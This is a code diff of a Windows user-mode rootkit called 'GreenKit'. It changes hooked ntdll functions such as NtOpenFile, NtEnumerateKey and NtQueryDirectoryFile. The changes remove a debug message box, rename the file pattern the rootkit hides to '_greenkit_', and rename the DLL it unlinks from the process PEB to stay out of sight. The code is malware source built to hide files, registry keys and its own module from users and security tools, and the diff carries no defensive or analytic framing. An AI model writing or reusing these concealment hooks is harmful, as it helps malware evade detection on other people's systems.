@@ -192,7 +192,6 @@ NTSTATUS WINAPI NewNtOpenFile(
     TCHAR sPath[MAX_PATH];
     //DWORD dwRet;
     //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
-    MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
 
     //if (!mustHideFile(*sPath))
     //NTSTATUS status = ((PNT_OPEN_FILE) hooking_getOldFunction("NtOpenFile"))(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
@@ -338,14 +337,14 @@ NTSTATUS WINAPI NewNtEnumerateKey(
 BOOL mustHideFile(UNICODE_STRING file) {
 	std::string a("greenkit.txt");
 	std::string b("greenkit.exe");
-	std::string c("greenkit");
+	std::string c("_greenkit_");
 	char str[500];
 	wcstombs(str, file.Buffer, 500);
 	if (_strCmp(str, a.c_str(), 12))
 		return TRUE;
 	else if (_strCmp(str, b.c_str(), 12))
 		return TRUE;
-	else if (_strCmp(str, c.c_str(), 8))
+	else if (_strCmp(str, c.c_str(), 10))
 		return TRUE;
 	else
 		return FALSE;
@@ -608,7 +607,7 @@ NTSTATUS WINAPI NewNtQueryDirectoryFile(
 		)
 	{
 		PELPEB peb = EL_GetPeb();
-		EL_HideModule(peb, L"GreenKit.dll");
+		EL_HideModule(peb, L"_greenkit_GreenKit.dll");
 		HMODULE NtDll = LoadLibrary("ntdll.dll");
 		HMODULE Kernel32 = LoadLibrary("kernel32.dll");
 
